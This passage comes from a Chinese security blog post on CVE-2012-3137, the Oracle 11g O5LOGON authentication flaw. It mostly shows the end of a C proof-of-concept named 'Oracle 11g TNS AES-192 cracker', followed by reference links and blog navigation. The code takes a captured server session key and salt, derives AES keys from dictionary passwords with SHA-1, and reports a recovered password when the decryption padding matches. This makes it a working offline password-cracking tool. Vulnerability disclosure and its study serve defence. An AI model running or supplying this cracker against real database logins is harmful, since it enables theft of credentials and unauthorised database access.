function_">ORACLE_MixCase_Hash</span> <span class="hljs-params">(<span class="hljs-type">char</span> *passwd, <span class="hljs-type">int</span> passwd_len, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> salt[<span class="hljs-number">10</span>], <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* oracle_mixcase_hash)</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> to_hash[<span class="hljs-number">256</span>];<br>    SHA_CTX ctx;<br><br>    <span class="hljs-built_in">memcpy</span> (to_hash, passwd, passwd_len);<br>    <span class="hljs-built_in">memcpy</span> (to_hash+passwd_len, salt, <span class="hljs-number">10</span>);<br><br>    SHA1_Init (&amp;ctx);<br>    SHA1_Update (&amp;ctx, to_hash, passwd_len+<span class="hljs-number">10</span>);<br>    SHA1_Final (oracle_mixcase_hash, &amp;ctx);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">ORACLE_TNS_Decrypt_AES192_CBC</span> <span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> aes_key_bytes[<span class="hljs-number">24</span>], <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* input, <span class="hljs-type">int</span> input_len, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* output)</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> iv[] = &#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;;<br><br>    AES_KEY key;<br>    AES_set_decrypt_key(aes_key_bytes, <span class="hljs-number">192</span>, &amp;key);<br>    AES_cbc_encrypt(input, output, input_len, &amp;key, iv, AES_DECRYPT);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">ORACLE_TNS_Encrypt_AES192_CBC</span> <span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> aes_key_bytes[<span class="hljs-number">24</span>], <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* input, <span class="hljs-type">int</span> input_len, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* output)</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> iv[] = &#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;;<br><br>    AES_KEY key;<br>    AES_set_encrypt_key(aes_key_bytes, <span class="hljs-number">192</span>, &amp;key);<br>    AES_cbc_encrypt(input, output, input_len, &amp;key, iv, AES_ENCRYPT);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">usage</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;o5logoncrack -k server sesskey -s salt -d dict\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span> &#123;<br><br>    <span class="hljs-type">char</span> password [<span class="hljs-number">100</span>];<br>    <span class="hljs-type">char</span> aes_key_bytes[<span class="hljs-number">24</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">char</span> dict_filename[<span class="hljs-number">256</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> Oracle_MixCaseHash[<span class="hljs-number">20</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> decrypted_server_sesskey[<span class="hljs-number">48</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> encrypted_server_sesskey[<span class="hljs-number">48</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> AUTH_SESSKEY[<span class="hljs-number">48</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> AUTH_VFR_DATA[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> len;<br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-type">int</span> debug = <span class="hljs-number">0</span>;<br>    FILE * fp = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-type">int</span> ch;<br>    <span class="hljs-type">int</span> args = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>( ( ch = getopt( argc, argv, <span class="hljs-string">&quot;k:s:d:v&quot;</span> ) ) != EOF ) &#123;<br>        <span class="hljs-keyword">switch</span>(ch) &#123;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;k&#x27;</span>:<br>            HexStringtoBinArray(optarg, AUTH_SESSKEY);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br>            HexStringtoBinArray(optarg, AUTH_VFR_DATA);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;d&#x27;</span>:<br>            <span class="hljs-built_in">strncpy</span>(dict_filename, optarg, <span class="hljs-number">255</span>);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;v&#x27;</span>:<br>            debug = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            usage();<br>        &#125;<br>        args++;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (args &lt; <span class="hljs-number">3</span>) usage();<br><br>    <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;*************************************************************\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;Oracle 11g TNS AES-192 cracker by zz@nsfocus\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;*************************************************************\n\n&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> ( (fp = fopen(dict_filename, <span class="hljs-string">&quot;r&quot;</span>)) == <span class="hljs-literal">NULL</span> ) &#123;<br>        perror(<span class="hljs-string">&quot;fail to read&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">while</span>(fgets(password, <span class="hljs-number">100</span>, fp) != <span class="hljs-literal">NULL</span>) &#123;<br><br>        len = <span class="hljs-built_in">strlen</span>(password);<br>        <span class="hljs-keyword">if</span> (password[len<span class="hljs-number">-1</span>] == <span class="hljs-number">0xa</span> &amp;&amp; password[len<span class="hljs-number">-2</span>] == <span class="hljs-number">0xd</span>) &#123;<br>            password[len<span class="hljs-number">-2</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> password[len<span class="hljs-number">-1</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br>        <span class="hljs-keyword">if</span> (debug)<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;try `%s&#x27;\n&quot;</span>, password);<br>        <span class="hljs-comment">// Create Oracle Hash from the salt (AUTH_VFR_DATA) and the password</span><br>        ORACLE_MixCase_Hash (password, <span class="hljs-built_in">strlen</span> (password), AUTH_VFR_DATA, Oracle_MixCaseHash);<br><br>        <span class="hljs-built_in">memset</span> (aes_key_bytes,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(aes_key_bytes));<br>        <span class="hljs-built_in">memcpy</span> (aes_key_bytes,Oracle_MixCaseHash, <span class="hljs-number">20</span>);<br><br>        <span class="hljs-keyword">if</span> (debug)<br>            hexdump(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;aes_key_bytes&quot;</span>, aes_key_bytes, <span class="hljs-keyword">sizeof</span>(aes_key_bytes));<br><br>        <span class="hljs-built_in">memset</span> (decrypted_server_sesskey, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(decrypted_server_sesskey));<br>        ORACLE_TNS_Decrypt_AES192_CBC (aes_key_bytes, AUTH_SESSKEY, <span class="hljs-number">48</span>, decrypted_server_sesskey);<br><br>        <span class="hljs-keyword">if</span> (debug)<br>            hexdump(<span class="hljs-built_in">stdout</span>, <span class="hljs-string">&quot;decrypted_server_sesskey&quot;</span>, decrypted_server_sesskey, <span class="hljs-keyword">sizeof</span>(decrypted_server_sesskey));<br><br>        ret = <span class="hljs-built_in">strncmp</span>(&amp;decrypted_server_sesskey[<span class="hljs-number">40</span>], <span class="hljs-string">&quot;\x08\x08\x08\x08\x08\x08\x08\x08&quot;</span>, <span class="hljs-number">8</span>);<br><br>        <span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>) &#123; <br>            <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;\nFound password: %s \n\n&quot;</span>, password);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-built_in">memset</span>(password, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(password));<br><br>    &#125;<br><br>    fclose(fp);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a target="_blank" rel="noopener" href="http://threatpost.com/en_us/blogs/flaw-oracle-logon-protocol-leads-easy-password-cracking-092012">http://threatpost.com/en_us/blogs/flaw-oracle-logon-protocol-leads-easy-password-cracking-092012</a></li>
<li><a target="_blank" rel="noopener" href="http://www.soonerorlater.hu/index.khtml?article_id=512">http://www.soonerorlater.hu/index.khtml?article_id=512</a></li>
<li><a target="_blank" rel="noopener" href="http://marcel.vandewaters.nl/oracle/security/cryptographic-flaws-in-oracle-database-authentication-protocol">http://marcel.vandewaters.nl/oracle/security/cryptographic-flaws-in-oracle-database-authentication-protocol</a></li>
<li><a target="_blank" rel="noopener" href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-3137">http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-3137</a></li>
<li><a target="_blank" rel="noopener" href="http://www.openwall.com/lists/john-users/2012/09/28/1">http://www.openwall.com/lists/john-users/2012/09/28/1</a></li>
<li><a target="_blank" rel="noopener" href="http://marcel.vandewaters.nl/oracle/security/password-hashes">http://marcel.vandewaters.nl/oracle/security/password-hashes</a></li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://usmacd.com">曼福吉</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://usmacd.com/cn/cve-2012-3137/">https://usmacd.com/cn/cve-2012-3137/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://usmacd.com" target="_blank">安全代码</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Security/">Security</a></div><div class="post-share"><div class="social-share" data-image="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/cn/debug_aosp_java_code/" title="调试AOSP Java 代码"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">调试AOSP Java 代码</div></div><div class="info-2"><div class="info-item-1">下载 Android 源代码，编译 12345$ source build/envsetup.sh$ lunch$ make$ mmm development/tools/idegen/$ ./development/tools/idegen/idegen.sh  运行后将生成下面几个文件 123android.ipr (IntelliJ / Android Studio)android.iml (IntelliJ / Android Studio).classpath  (Eclipse)    在Android Studio 中导入 android.ipr  File -&gt; Open 选择 android.ipr, 导入后可以Android Studio 中浏览AOSP 源码  设置远程调试配置文件  Run -&gt; Edit Configuration 点击左上角的 + 类型选择 Remote  Attack 到需要调试的进程  这里有两种方法，一是使用SDK 提供的 Monitor 二是使用 Android Studio 自带的Attach debugger t...</div></div></div></a><a class="pagination-related" href="/cn/compile_android_source_code/" title="编译 Android 系统源码  （AOSP）"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">编译 Android 系统源码  （AOSP）</div></div><div class="info-2"><div class="info-item-1">☆ 1. 下载源码由于众所周知的原因，国内访问 Android 源码不大方便， 清华大学做了一件好事， 弄了个 mirror。 https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/ 下载 repoGoogle 自己搞一个源码同步工具，需要下下载。 1234mkdir ~/binPATH=~/bin:$PATHcurl https://storage.googleapis.com/git-repo-downloads/repo &gt; ~/bin/repochmod a+x ~/bin/repo  上面命令，下载 repo  并将 ~&#x2F;bin 加入 PATH 环境变量 使用每月更新的初始化包123456wget -c https://mirrors.tuna.tsinghua.edu.cn/aosp-monthly/aosp-latest.tar # 下载初始化包tar xf aosp-latest.tarcd AOSP   # 解压得到的 AOSP 工程目录# 这时 ls 的话什么也看不到，因为只有一个隐藏的 .repo 目录...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/cn/afl-fuzz1/" title="Dissecting American Fuzzy Lop A FuzzBench Evaluation 要点"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-06</div><div class="info-item-2">Dissecting American Fuzzy Lop A FuzzBench Evaluation 要点</div></div><div class="info-2"><div class="info-item-1">paper: https://www.s3.eurecom.fr/docs/fuzzing22_fioraldi_report.pdf 两个实验的结论 (主要基于 FuzzBench) Our conclusion after this experiment is that AFL, and follow-ups fuzzers like AFL++, should provide an optionto disable hitcounts. AFL++ provides many different op-tions, and the users are suggested to run an instance of each variant when doing parallel fuzzing, a common use-case in real-world setups. The fact that in our experiments,hitcounts have shown a highly variadic behavior suggests that users ...</div></div></div></a><a class="pagination-related" href="/en/How_do_you_actually_find_bugs/" title="Keynote - How Do You Actually Find Bugs?"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-06</div><div class="info-item-2">Keynote - How Do You Actually Find Bugs?</div></div><div class="info-2"><div class="info-item-1">https://www.youtube.com/watch?v=7Ysy6iA2sqA&amp;ab_channel=OffensiveCon  Temperament Curiosity Detail-oriented Ability to deal with failure and continual evidence that you’re wrong   Learn how to deal with failure Two projects (can be unrealeted, or different parts of the same) Learn to recognize whe you have hit a wall and have become unproductive Switch to your secondary project   Consider having a development project as your seconary project Do an achiveable, measurable task Regain a sense...</div></div></div></a><a class="pagination-related" href="/cn/libprotobuf-mutator/" title="libprotobuf-mutator 简单分析"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-06</div><div class="info-item-2">libprotobuf-mutator 简单分析</div></div><div class="info-2"><div class="info-item-1">What are protocol buffers?Protocol buffers are Google’s language-neutral, platform-neutral, extensible mechanism for serializing structured data – think XML, but smaller, faster, and simpler. You define how you want your data to be structured once, then you can use special generated source code to easily write and read your structured data to and from a variety of data streams and using a variety of languages. 这段是 Google 官方网站给出的介绍，protobuf 可以自动化生成代码，用于读入或者写入结构化数据。一个简单的 protobuf 文件可以是这样的： 1234...</div></div></div></a><a class="pagination-related" href="/cn/webview_java/" title="Android WebView 漏洞"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-06</div><div class="info-item-2">Android WebView 漏洞</div></div><div class="info-2"><div class="info-item-1">☆ 来自 developer.android.com 的信息Android 官方网站对addJavascriptInterface的介绍如下： 123456789101112public void addJavascriptInterface (Object object, String name)  Added in API level 1Injects the supplied Java object into this WebView. The object is injected intothe JavaScript context of the main frame, using the supplied name. This allows the Java object&#x27;s methods to be accessed from JavaScript. For applicationstargeted to API level JELLY_BEAN_MR1 and above, only public methods that are annotated w...</div></div></div></a><a class="pagination-related" href="/cn/request_RESERVED_CVE/" title="How to request a RESERVED CVE"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-06</div><div class="info-item-2">How to request a RESERVED CVE</div></div><div class="info-2"><div class="info-item-1">在申请 CVE 过程中会遇到一个问题，向软件官方提交漏洞修复后，由于软件官方不是CNA 无法直接分配CVE，而申请CVE 通常需要一个软件官方确认的链接，而有些比较正规的软件在漏洞修复之前是不会有公开链接的，这就无法申请CVE了。 有点鸡生蛋，蛋生鸡的感觉。解决这个问题的办法是申请一个 RESERVED CVE。 申请 RESERVED CVE 方法申请 RESERVED CVE，也是需要填写的CVE 申请表格的 https://cveform.mitre.org/，选择 Request CVE ID 根据提示的重要信息： 12345IMPORTANT: Once a CVE ID is assigned to your vulnerability, it will not be published in the CVE List until you have submitted a URL pointing to public information about the vulnerability. Without a public reference, the CVE ID ...</div></div></div></a><a class="pagination-related" href="/cn/ollama_unauthenticated/" title="Ollama 的未授权访问问题"><img class="cover" src="https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-20</div><div class="info-item-2">Ollama 的未授权访问问题</div></div><div class="info-2"><div class="info-item-1">Ollama 是一个简单易用的本地大模型运行框架，它可以让你在本地电脑上轻松运行和管理各种大语言模型。Github 地址：https://github.com/ollama/ollama 有用户提出给 Ollama API 添加认证的需求 Requesting support for basic auth or API key authentication， Ollama 官方没有处理，所以在默认设置下 Ollama 存在未授权访问问题。 以下的代码在 Ollama v0.5.11 下测试成功。 判断是否 Ollama 运行在 11434 端口1234567curl -i http://127.0.0.1:11434HTTP/1.1 200 OKContent-Type: text/plain; charset=utf-8Date: Tue, 18 Feb 2025 11:12:57 GMTContent-Length: 17Ollama is running   列出 Ollama 提供的 LLM 模型curl http://127.0.0.1:11434/api/tags |...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">曼福吉</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">169</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="/rss.xml" target="_blank" title="RSS"><i class="fas fa-rss" style="color: #4c566a;"></i></a><a class="social-icon" href="https://x.com/henices" target="_blank" title="Twitter"><i class="fab fa-x-twitter" style="color: #4c566a;"></i></a><a class="social-icon" href="mailto:zhouzhenster@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4c566a;"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">漏洞概述:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle-O5LOGON-%E5%8D%8F%E8%AE%AE%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.</span> <span class="toc-text">Oracle O5LOGON 协议介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit-POC"><span class="toc-number">3.</span> <span class="toc-text">exploit (POC)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/keep_hard/" title="坚持的秘诀">坚持的秘诀</a><time datetime="2025-12-15T16:00:00.000Z" title="发表于 2025-12-16 00:00:00">2025-12-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/investment_category2/" title="金融市场中的不同流派 (2)">金融市场中的不同流派 (2)</a><time datetime="2025-12-09T16:00:00.000Z" title="发表于 2025-12-10 00:00:00">2025-12-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/how_to_set_a_goal/" title="如何设定一个好目标">如何设定一个好目标</a><time datetime="2025-12-04T16:00:00.000Z" title="发表于 2025-12-05 00:00:00">2025-12-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/know_Evolution/" title="如何理解演化论的思想">如何理解演化论的思想</a><time datetime="2025-11-20T16:00:00.000Z" title="发表于 2025-11-21 00:00:00">2025-11-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/cn/investment_expectation/" title="金融投资中的预期思维">金融投资中的预期思维</a><time datetime="2025-11-19T16:00:00.000Z" title="发表于 2025-11-20 00:00:00">2025-11-20</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://images.unsplash.com/photo-1646026371686-79950ceb6daa?w=640);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By 曼福吉</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3"></script><script src="/js/main.js?v=5.5.3"></script><script src="/js/tw_cn.js?v=5.5.3"></script><div class="js-pjax"><script>(() => {
  const runMermaid = ele => {
    window.loadMermaid = true
    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

    ele.forEach((item, index) => {
      const mermaidSrc = item.firstElementChild
      const config = mermaidSrc.dataset.config ? JSON.parse(mermaidSrc.dataset.config) : {}
      if (!config.theme) {
        config.theme = theme
      }
      const mermaidThemeConfig = `%%{init: ${JSON.stringify(config)}}%%\n`
      const mermaidID = `mermaid-${index}`
      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent

      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
      const renderMermaid = svg => {
        mermaidSrc.insertAdjacentHTML('afterend', svg)
      }

      // mermaid v9 and v10 compatibility
      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
    })
  }

  const codeToMermaid = () => {
    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
    if (codeMermaidEle.length === 0) return

    codeMermaidEle.forEach(ele => {
      const preEle = document.createElement('pre')
      preEle.className = 'mermaid-src'
      preEle.hidden = true
      preEle.textContent = ele.textContent
      const newEle = document.createElement('div')
      newEle.className = 'mermaid-wrap'
      newEle.appendChild(preEle)
      ele.parentNode.replaceWith(newEle)
    })
  }

  const loadMermaid = () => {
    if (false) codeToMermaid()
    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
    if ($mermaid.length === 0) return

    const runMermaidFn = () => runMermaid($mermaid)
    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.12.2/dist/mermaid.min.js').then(runMermaidFn)
  }

  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
})()</script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.3"></script></div></div></body></html>